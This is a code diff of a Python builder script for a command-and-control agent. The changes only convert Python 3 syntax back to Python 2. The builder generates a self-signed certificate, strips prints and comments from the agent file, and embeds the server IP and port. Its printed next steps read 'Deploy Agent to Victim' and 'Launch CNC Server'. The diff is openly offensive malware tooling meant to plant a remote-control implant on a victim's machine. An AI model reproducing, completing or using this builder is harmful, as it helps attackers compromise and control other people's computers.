@@ -1,4 +1,4 @@
-#!/usr/bin/python3
+#!/usr/bin/python
 
 import os
 
@@ -33,13 +33,13 @@ else:
 ###
 def certificateFunc():
     while True:
-        user_input = str(input("[!] Do you wish to create a Self Signed Cert?\n" + "[+] Type 'yes' or 'no'\n"))
+        user_input = str(raw_input("[!] Do you wish to create a Self Signed Cert?\n" + "[+] Type 'yes' or 'no'\n"))
         #print(user_input)
 
         if user_input.lower() == 'yes':            
             print("[*] Generating Self-Signed Certificate...")
             os.system("openssl req -new -x509 -keyout " + cert + " -out " + cert + " -days 365 -nodes -subj '/C=US' >/dev/null 2>&1")
-            print(("[*] Certificate created and written to " + cert))
+            print("[*] Certificate created and written to " + cert)
             break
         elif user_input.lower() == 'no':
             print("[*] No problem.. but make sure you have your own certificate located in ./ServerRequirements named 'server.pem'")
@@ -55,11 +55,11 @@ def cleanupFunc():
         print('[*] Cleaning up...')
         #print('[*] Renaming ' + finalTemp + ' to ' + finalAgent)
         os.rename(finalTemp, finalAgent)
-        print(('[*] Final Agent file is located in ' + finalAgent))
+        print('[*] Final Agent file is located in ' + finalAgent)
         print('[*] Next Steps..')
         print('')
-        print(('[1] Deploy ' + finalAgent + ' Agent to Victim'))
-        print(('[2] Run ' + finalAgent))
+        print('[1] Deploy ' + finalAgent + ' Agent to Victim')
+        print('[2] Run ' + finalAgent)
         print('[3] Run commandServer.py to Launch CNC Server')
     else:
         print('temp was never here')
@@ -71,7 +71,7 @@ def cleanupFunc():
 def removePrintStatements():
     while True:
         s = open(finalTemp, "r").read() # Open Final Name
-        user_input = str(input("[!] Do you wish to strip print statements from final Agent File?" + '\n' + "[+] Type 'yes' or 'no'" + '\n'))
+        user_input = str(raw_input("[!] Do you wish to strip print statements from final Agent File?" + '\n' + "[+] Type 'yes' or 'no'" + '\n'))
 
         #print(user_input)
         # Print Temp Function Variable
@@ -103,7 +103,7 @@ def stripCommentsFunc():
         # Vriable for reading finalName
         #print('[!] Opening Temp File..')
         s = open(temp, 'r').read()
-        user_input = str(input("[!] Do you wish to strip comments from final Agent File?" + '\n' + "[+] Type 'yes' or 'no'" + '\n'))
+        user_input = str(raw_input("[!] Do you wish to strip comments from final Agent File?" + '\n' + "[+] Type 'yes' or 'no'" + '\n'))
 
         #print(user_input)
 
@@ -146,11 +146,11 @@ def stripCommentsFunc():
             continue
 
 def addServerPortFunc():
-    print("[+] What is the IP Address of the Server")
-    ip = str(input(''))
-    print("[+] What is the Port you want to listen on")
-    port = str(input())
-    print(('[!] Server is ' + ip + ':' + port))
+    print "[+] What is the IP Address of the Server"
+    ip = str(raw_input(''))
+    print "[+] What is the Port you want to listen on"
+    port = str(raw_input())
+    print('[!] Server is ' + ip + ':' + port)
     server = (ip+':'+port)
 
     # Old line and New Line
